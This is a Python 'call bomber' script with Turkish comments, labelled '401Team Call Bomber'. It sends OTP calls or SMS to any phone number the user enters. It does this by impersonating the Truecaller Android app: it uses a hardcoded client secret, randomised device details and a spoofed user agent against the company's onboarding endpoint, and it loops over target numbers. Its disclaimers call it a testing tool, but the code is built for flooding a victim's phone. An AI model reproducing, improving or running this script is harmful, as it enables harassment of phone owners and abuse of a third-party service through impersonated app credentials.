# -*- coding: utf-8 -*-
# Gerekli kütüphane: pip install requests
import requests
import random
import hashlib
import time
import json # JSON yanıtını işlemek için
import re   # Telefon numarasını ayrıştırmak için
import sys
import uuid # Daha standart device_id için eklendi

# --- UYARI ---
# Bu araç, Truecaller API'sini kullanarak arama/OTP göndermeyi dener.
# API anahtarı (client_secret) ve endpoint güncel olmayabilir ve çalışmayabilir.
# API'ler sık sık değişir. Başarı garanti edilmez.
# Yasa dışı kullanımdaki tüm sorumluluk kullanıcıya aittir.
# --- UYARI SONU ---

# Colorama import ve fallback
try:
    from colorama import init, Fore, Style
    init(autoreset=True)
except ImportError:
    print("Uyarı: Renkli çıktılar için 'colorama' kütüphanesi gerekli. (pip install colorama)")
    class Fore: YELLOW = ""; RED = ""; CYAN = ""; GREEN = ""; BLUE = ""; MAGENTA = ""
    class Style: RESET_ALL = ""; BRIGHT = ""

# Telefon numarasını ayrıştırma fonksiyonu
def parse_phone_number(phone_input):
    """
    Verilen telefon numarası girdisinden ülke kodu, çevirme kodu ve
    asıl numarayı ayrıştırır. Örnek: +905551234567
    """
    # '+' ile başlayan, 1-3 haneli ülke kodu, 10 veya daha fazla haneli numara
    match = re.match(r'\+(\d{1,3})(\d{10,})$', phone_input)
    if match:
        dialing_code = match.group(1)
        number = match.group(2)
        # Basit bir ülke kodu -> ISO ülke kodu eşleştirmesi (genişletilebilir)
        country_codes = {
            "90": "TR", # Türkiye
            "1": "US",  # ABD/Kanada
            "44": "GB", # İngiltere
            "49": "DE", # Almanya
            "20": "EG", # Mısır
            "91": "IN", # Hindistan
            # Diğer ülkeleri buraya ekleyebilirsiniz
        }
        country_iso = country_codes.get(dialing_code, None) # Eşleşme yoksa None
        if country_iso:
            return country_iso, dialing_code, number
        else:
            print(f"{Fore.RED}HATA: +{dialing_code} için bilinen ISO ülke kodu bulunamadı.{Style.RESET_ALL}")
            return None, None, None
    else:
        print(f"{Fore.RED}HATA: Geçersiz telefon numarası formatı. '+' ile başlamalı ve ülke kodunu içermelidir (Örn: +905551234567).{Style.RESET_ALL}")
        return None, None, None

def send_call(phone_number_full):
    """Belirtilen numaraya Truecaller API'si üzerinden arama isteği gönderir."""

    country_code, dialing_code, number_only = parse_phone_number(phone_number_full)

    if not country_code:
        return # Ayrıştırma başarısız olduysa fonksiyondan çık

    # Rastgele cihaz ID oluştur
    device_id = str(uuid.uuid4()) # Daha standart bir ID

    # API URL ve Headerlar
    # Not: Bu endpoint ve secret büyük ihtimalle artık geçerli DEĞİLDİR!
    url = 'https://account-asia-south1.truecaller.com/v3/sendOnboardingOtp'
    client_secret = 'lvc22mp3l1sfv6ujg83rd17btt' # Bu büyük ihtimalle geçersiz
    user_agent = f'Truecaller/13.{random.randint(10, 50)}.8 (Android;{random.choice(["10","11","12","13"])}.0)' # Biraz daha güncel Android sürümleri

    headers = {
        'clientsecret': client_secret,
        'user-agent': user_agent,
        'accept-encoding': 'gzip',
        'content-type': 'application/json; charset=UTF-8',
    }

    # JSON Payload (dinamik ülke kodları ve bazı rastgele değerler ile)
    payload = {
        "countryCode": country_code,
        "dialingCode": int(dialing_code),
        "installationDetails": {
            "app": {"buildVersion": random.randint(5,10), "majorVersion": 13, "minorVersion": random.randint(10, 50), "store": "GOOGLE_PLAY"},
            "device": {"deviceId": device_id, "language": "en", "manufacturer": random.choice(["Xiaomi", "Samsung", "Google"]), "mobileServices": ["GMS"], "model": random.choice(["Redmi Note 10", "Galaxy S22", "Pixel 7"]), "osName": "Android", "osVersion": random.choice(["11.0", "12.0", "13.0"]), "simSerials": []},
            "language": "en",
            "sims": [{"mcc": 0, "mnc": 0, "slot": 0}], # Bazı API'ler boş SIM bilgisi kabul etmeyebilir
            "storeVersion": {"buildVersion": random.randint(5,10), "majorVersion": 13, "minorVersion": random.randint(10, 50)}
        },
        "phoneNumber": number_only,
        "region": "region-1",
        "sequenceNo": random.randint(1, 5)
    }

    try:
        print(f"{Fore.CYAN}İstek gönderiliyor: {phone_number_full} (Ülke: {country_code}, Numara: {number_only}){Style.RESET_ALL}")
        # İsteği gönder
        response = requests.post(url, headers=headers, json=payload, timeout=20) # Timeout artırıldı

        # Yanıtı işle
        print(f"{Fore.CYAN}Yanıt Kodu: {response.status_code}{Style.RESET_ALL}")
        try:
            response_json = response.json()
            # Yanıtı daha okunabilir formatta yazdır
            print(f"{Fore.CYAN}Yanıt JSON:\n{json.dumps(response_json, indent=2)}{Style.RESET_ALL}")

            # Truecaller API'sinin olası yanıtlarına göre durum değerlendirmesi
            status = response_json.get("status")
            message = response_json.get("message", "Mesaj yok")
            token_ttl = response_json.get("tokenTtl", "N/A")

            if response.status_code == 200:
                # Başarı olarak kabul edilebilecek durum kodları (API dokümanı olmadan tahmin)
                if status in [1, 6, 8, 10] or "success" in message.lower():
                     print(f"{Fore.GREEN}{Style.BRIGHT}İSTEK BAŞARILI GÖRÜNÜYOR! (Status: {status}){Style.RESET_ALL}")
                     print(f"{Fore.GREEN}Arama veya SMS yakında gelmeli. Yanıt Mesajı: {message} (TTL: {token_ttl} saniye){Style.RESET_ALL}")
                # Bilinen hata durumları
                elif status == 18:
                     print(f"{Fore.RED}HATA: Geçersiz Telefon Numarası! (Status: {status}) - Mesaj: {message}{Style.RESET_ALL}")
                elif status == 9 or status == 13:
                     print(f"{Fore.RED}HATA: Çok Fazla İstek/Hız Limiti! (Status: {status}) - Daha sonra tekrar deneyin. Mesaj: {message}{Style.RESET_ALL}")
                elif status == 7:
                     print(f"{Fore.RED}HATA: Kullanıcı Engellenmiş! (Status: {status}) - Mesaj: {message}{Style.RESET_ALL}")
                elif status == 2:
                     print(f"{Fore.RED}HATA: Geçersiz Client Secret veya API Anahtarı! (Status: {status}) - Mesaj: {message}{Style.RESET_ALL}")
                else:
                     # Bilinmeyen ama 200 dönen durumlar
                     print(f"{Fore.YELLOW}UYARI: İstek gönderildi ancak başarı durumu net değil (Status: {status}). Mesaj: {message}{Style.RESET_ALL}")
            else:
                # 200 OK dışında bir HTTP kodu geldiyse
                print(f"{Fore.RED}HATA: İstek başarısız oldu. Sunucu yanıtı (JSON): {message} (Status: {status}){Style.RESET_ALL}")

        except json.JSONDecodeError:
            # Yanıt JSON değilse
            print(f"{Fore.RED}HATA: Sunucu yanıtı JSON formatında değil.{Style.RESET_ALL}")
            print(f"{Fore.CYAN}Yanıt Metni (ilk 500 karakter):\n{response.text[:500]}{Style.RESET_ALL}")
        except Exception as e:
            # Yanıt işlenirken başka bir hata olursa
            print(f"{Fore.RED}HATA: Yanıt işlenirken hata oluştu: {e}{Style.RESET_ALL}")

    except requests.exceptions.Timeout:
        print(f"{Fore.RED}HATA: İstek zaman aşımına uğradı. Sunucu yanıt vermiyor veya ağ yavaş.{Style.RESET_ALL}")
    except requests.exceptions.ConnectionError as e:
         print(f"{Fore.RED}HATA: Bağlantı hatası oluştu: {e}{Style.RESET_ALL}")
    except requests.exceptions.RequestException as e:
        # Diğer requests kütüphanesi hataları
        print(f"{Fore.RED}HATA: İstek gönderilirken bir hata oluştu: {e}{Style.RESET_ALL}")
    except Exception as e:
        # Beklenmedik diğer hatalar
        print(f"{Fore.RED}Beklenmedik bir hata oluştu: {e}{Style.RESET_ALL}")

# Ana çalıştırma bloğu
if __name__ == "__main__":
    # Colorama import'u yukarıda yapıldı ve fallback mekanizması var.

    print(f"{Fore.BLUE}--- 401Team Call Bomber ---{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}UYARI: Bu araç yalnızca test amacıyla kullanılmalıdır.")
    print(f"{Fore.YELLOW}Yasa dışı kullanımdaki tüm sorumluluk kullanıcıya aittir.")
    print(f"{Fore.YELLOW}Callbomb API'si zamanla değişebilir veya çalışmayabilir.\n{Style.RESET_ALL}")

    while True:
        try:
            phone_input = input(f"{Fore.MAGENTA}Hedef no (Örn: +905xxxxxxxxx) veya çıkmak için 'q': {Style.RESET_ALL}").strip()
            if phone_input.lower() == 'q':
                break
            if phone_input:
                send_call(phone_input)
            else:
                print(f"{Fore.RED}Lütfen bir numara girin.{Style.RESET_ALL}")

            print("-" * 40) # İstekler arasına ayırıcı koy
            # İsteğe bağlı olarak istekler arası bekleme eklenebilir
            # time.sleep(1)

        except KeyboardInterrupt:
            print("\nÇıkılıyor...")
            break

    print(f"\n{Fore.BLUE}Program sonlandırıldı.{Style.RESET_ALL}")